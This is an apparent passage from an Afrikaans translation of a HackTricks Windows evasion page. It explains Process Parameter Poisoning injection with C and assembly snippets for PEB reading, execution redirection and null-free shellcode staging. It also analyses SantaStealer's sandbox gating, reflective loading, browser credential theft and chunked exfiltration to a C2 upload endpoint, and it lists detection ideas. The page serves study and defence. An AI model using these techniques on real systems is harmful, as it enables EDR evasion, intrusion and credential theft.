Process Parameter Poisoning (P3) is ’n **process-injection / EDR-evasion**-tegniek wat die klassieke remote write-pad (`VirtualAllocEx` + `WriteProcessMemory`) vermy. In plaas daarvan om grepe na ’n reeds lopende teiken te kopieer, misbruik dit die feit dat Windows **geselekteerde `CreateProcessW`-opstartparameters na die child process kopieer** en dit binne `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) stoor.<sup>[[28]](#references)[[29]](#references)</sup>

### Vergiftigbare draers wat deur `CreateProcessW` gekopieer word

Nuttige draers is:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (met `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktiese beperkings van draers:

- `lpCommandLine` moet na **skryfbare geheue** vir `CreateProcessW` wys, en is beperk tot **32,767 Unicode-karakters**, insluitend die null-terminator.
- `lpEnvironment` moet ’n Unicode-omgewingsblok wees van opeenvolgende `NAME=VALUE\0`-stringe wat deur ’n ekstra `\0` beëindig word.
- `lpReserved` is amptelik gereserveer, dus moet die `ShellInfo`-kartering as ’n implementeringsdetail eerder as ’n stabiele, gedokumenteerde kontrak beskou word.

Dit verander normale process creation in die **payload-transfer primitive**. Die operateur skep die child process met aanvaller-beheerde opstartdata en laat Windows die kopie oor prosesse heen uitvoer.

### Afgeleë opsoekvloei sonder remote write-API’s

Nadat die child geskep is, los die gekopieerde buffer met **leesalleen**-primitiewe op:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → kry `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Lees die afgeleë `PEB`
3. Volg `PEB.ProcessParameters`
4. Lees `RTL_USER_PROCESS_PARAMETERS`
5. Gebruik die geselekteerde pointer:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimale vloei:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Voer die gekopieerde parameterbuffer uit

Die gekopieerde parametergedeelte is gewoonlik `RW`, nie uitvoerbaar nie. ’n Algemene P3-ketting is:

1. Skep die proses normaalweg (nie opgeskort nie)
2. Maak die gekose parameterbladsy uitvoerbaar met `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Hergebruik die hoofthread-handle wat reeds in `PROCESS_INFORMATION` teruggegee is
4. Herlei uitvoering met `NtSetContextThread` (`CONTEXT_CONTROL`, oorskryf `RIP`)

Anders as klassieke thread-hijacking-werkvloeie, **vereis dit nie** `SuspendThread` / `ResumeThread` nie; die konteks kan direk op die teruggekeerde hoofthread-handle verander word.

Dit vermy verskeie API’s wat algemeen vir injection gemonitor word:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- dikwels ook `SuspendThread` / `ResumeThread`

### Nulgreepbeperking en gefaseerde shellcode

Al drie draers is **string- of stringagtige data**, dus word ’n rou payload wat `0x00` bevat tydens oordrag afgekap. ’n Praktiese oplossing is ’n **nulvrye eerste fase** wat konstantes tydens looptyd herbou en dan ’n arbitrêre tweede fase laai.

’n Eenvoudige patroon is XOR-gebaseerde sintese van konstantes:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Dit laat die eerste stadium stack-strings, API-argumente, DLL-paaie of ’n second-stage shellcode loader bou sonder om null-grepe in die oorgedraagde parameter in te sluit.

### Stack-gebaseerde API-oproepe vanaf die eerste stadium

Wanneer die eerste stadium API’s soos `LoadLibraryA` moet aanroep, kan dit:

- die string/buffer op die teiken se stack plaas
- die **32-byte x64 shadow space** reserveer
- `RCX`, `RDX`, `R8`, `R9` op konstantes of `RSP`-relatiewe wysers stel
- `RSP` **16-byte aligned** hou voor die oproep

’n Tweede stadium kan dan vanaf die stack na ’n `PAGE_READWRITE`-toewysing gekopieer word, met `VirtualProtect` na `PAGE_EXECUTE_READ` verander word, en daarnaartoe spring. Dit vermy ’n direkte RWX-toewysing.

### Opsporingsidees

Goeie jaggeleenthede wat die outeurs noem:

- `VirtualProtectEx` / `NtProtectVirtualMemory` wat **process-parameter-bladsye uitvoerbaar maak**
- daardie beskermingsverandering, gevolg deur `SetThreadContext` / `NtSetContextThread`
- afgeleë leesbewerkings van `PEB` en daarna `RTL_USER_PROCESS_PARAMETERS`
- buitengewoon lang / hoë-entropie `lpCommandLine`-, `lpEnvironment`- of `STARTUPINFO.lpReserved`-waardes tydens proseskepping

### Notas

- P3 is ’n **oordragtruuk tussen prosesse**, nie op sigself ’n volledige uitvoeringsprimitief nie: die gekopieerde parameter benodig steeds ’n verandering van uitvoertoestemming en ’n metode om uitvoering daarheen te herlei.
- Die outeurs het `RtlCreateProcessReflection` / Dirty Vanity oorweeg, maar dit verwerp omdat dit intern verdagte primitiewe soos `NtWriteVirtualMemory` en `NtCreateThreadEx` aanroep.

## SantaStealer se tegnieke vir AV-ontduiking sonder lêers en geloofsbriewediefstal

SantaStealer (ook bekend as BluelineStealer) wys hoe moderne info-stealers AV bypass, anti-analise en toegang tot geloofsbriewe in ’n enkele werkvloei kombineer.<sup>[[24]](#references)</sup>

### Sleutelborduitleg-gating en sandbox-vertraging

- ’n Konfigurasievlag (`anti_cis`) lys geïnstalleerde sleutelborduitlegte met `GetKeyboardLayoutList`. As ’n Cyrilliese uitleg gevind word, skep die sample ’n leë `CIS`-merker en beëindig dit, voordat stealers uitgevoer word. Dit verseker dat dit nooit op uitgeslote liggings afgaan nie, terwyl dit ’n artefak laat waarop jagters kan soek.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Gelaagde `check_antivm`-logika

- Variant A loop deur die proseslys, hash elke naam met ’n pasgemaakte rollende kontrolesom en vergelyk dit met ingebedde bloklyste vir debuggers/sandboxes; dit herhaal die kontrolesom oor die rekenaarnaam en kontroleer werkgidse soos `C:\analysis`.
- Variant B ondersoek stelseleienskappe (minimum prosesgetal, onlangse looptyd), roep `OpenServiceA("VBoxGuest")` aan om VirtualBox-byvoegings op te spoor en voer tydsberekeningkontroles rondom slaaptye uit om single-stepping raak te sien. Enige treffer laat die proses staak voordat modules begin.

### Lêerlose helper + dubbele ChaCha20-reflective loading

- Die primêre DLL/EXE bevat ’n Chromium-credential helper wat óf na skyf geskryf óf met die hand in die geheue gekarteer word; in lêerlose modus los dit self imports/relocations op, sodat geen helper-artefakte geskryf word nie.
- Daardie helper stoor ’n tweede-fase-DLL wat twee keer met ChaCha20 geënkripteer is (twee 32-greep-sleutels + 12-greep-nonces). Ná albei rondtes laai dit die blob reflectief (geen `LoadLibrary` nie) en roep die exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` aan, afgelei van [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Die ChromElevator-roetines gebruik direct-syscall reflective process hollowing om in ’n aktiewe Chromium-blaaier in te spuit, AppBound Encryption-sleutels te erf en wagwoorde/cookies/kredietkaartdata direk uit SQLite-databasisse te dekripteer, ondanks ABE-verharding.

### Modulêre versameling in die geheue & HTTP-uitfiltrering in stukke

- `create_memory_based_log` loop deur ’n globale `memory_generators`-funksiewysertabel en begin een thread per geaktiveerde module (Telegram, Discord, Steam, skermskote, dokumente, blaaieruitbreidings, ens.). Elke thread skryf resultate na gedeelde buffers en rapporteer sy lêertelling ná ’n aansluitvenster van ongeveer 45 sekondes.
- Wanneer alles klaar is, word alles met die staties gekoppelde `miniz`-biblioteek as `%TEMP%\\Log.zip` gezip. `ThreadPayload1` slaap dan 15 sekondes en stroom die argief in stukke van 10 MB via HTTP POST na `http://<C2>:6767/upload`, terwyl ’n blaaier se `multipart/form-data`-grens nageboots word (`----WebKitFormBoundary***`). Elke stuk voeg `User-Agent: upload`, `auth: <build_id>` en, opsioneel, `w: <campaign_tag>` by; die laaste stuk voeg `complete: true` by sodat die C2 weet dat die herbouing klaar is.

## References

- [1] [Gevorderde evasion-tegnieke: presisie-module-stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Oproepstapels: geen gratis deurgange meer vir malware nie](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – dokumentasie](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – voorbeeld](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – voorbeeld](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC vir vervalsing van oproepstapels](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nuwe infeksieketting en ConfuserEx-gebaseerde obfuskasie vir DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Moet jy jou zero trust vertrou? Omseiling van Zscaler-posisiekontroles](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Voor ToolShell: Verkenning van Storm-2603 se vorige ransomware-bedrywighede](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Misbruik van aangestuurde exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11-inventaris van aangestuurde exports (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Soekvolgorde vir dinamiese skakelbiblioteke](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Prosessekuriteit en toegangsregte](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU-verwysing (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL-lanseerder](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Hoe om EDR’s teë te werk met die ondersteuning van Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Breek die beskermende dop van Windows Defender met die gidsherleidingstegniek](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Verwysing vir die mklink-opdrag](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Onder die Pure-gordyn: Van RAT tot bouer tot kodeerder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer kom stad toe: ’n Nuwe, ambisieuse infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Dekripsie van Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Node.js-malware verslaan met API-opsporing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Sit Adaptix aan die slaap met Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Vergiftiging van prosesparameters](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET en vervalsing van stapels](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko-slaapobfuskasie](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Versteek jou Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Misbruik van Chrome Remote Desktop in Red Team-bedrywighede: ’n praktiese gids](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Verandering van Defender se herstelbestuurder in ’n kernel-bewerkingsprimitief](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo-metgeselkode](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Skep van selfmaskerende funksies met LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
{{#include ../banners/hacktricks-training.md}}
